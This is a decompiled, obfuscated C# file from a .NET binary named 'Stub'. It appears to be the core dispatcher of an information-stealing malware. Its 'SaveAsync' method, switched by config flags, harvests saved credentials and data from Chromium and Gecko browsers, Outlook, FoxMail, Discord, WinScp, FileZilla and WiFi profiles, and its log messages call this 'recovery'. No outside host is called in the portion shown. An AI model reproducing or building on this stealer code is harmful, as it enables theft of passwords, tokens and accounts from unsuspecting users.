using System;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000A3 RID: 163
	internal sealed class Reports
	{
		// Token: 0x06000245 RID: 581 RVA: 0x00017034 File Offset: 0x00015234
		public static async Task SaveAsync()
		{
			await Task.Run(delegate
			{
				if (Config.ChromiumBrowser == "1")
				{
					Logging.Log("Chrome Browser Recovery Enabled...", true);
					ChromiumRecovery.SaveChromiumDataToFiles();
				}
				if (Config.GeckoBrowser == "1")
				{
					Logging.Log("Gecko Browser Recovery Enabled...", true);
					GeckoRecovery.SaveGeckoData();
				}
				if (Config.OutlookDesktopApp == "1")
				{
					Logging.Log("Outlook App Recovery Enabled...", true);
					Outlook.GrabOutlook();
				}
				if (Config.FoxMailApp == "1")
				{
					Logging.Log("Fox Mail App Recovery Enabled...", true);
					FoxMail.SaveFoxMailAccountsToFile();
				}
				if (Config.Discord == "1")
				{
					Logging.Log("Discord App Recovery Enabled...", true);
					Discord.SaveRecoveredDiscordDetails();
				}
				if (Config.WinScp == "1")
				{
					Logging.Log("WinScp App Recovery Enabled...", true);
					WinScp.SaveWinScpDetails();
				}
				if (Config.FileZilla == "1")
				{
					FileZilla.SaveFileZillaCredentials();
				}
				if (Config.Wifi == "1")
				{
					Wifi.ScanAndSaveWifiInformation();
				}
			});
		}

		// Token: 0x06000246 RID: 582 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Reports()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000247 RID: 583 RVA: 0x000038AD File Offset: 0x00001AAD
		static Reports()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
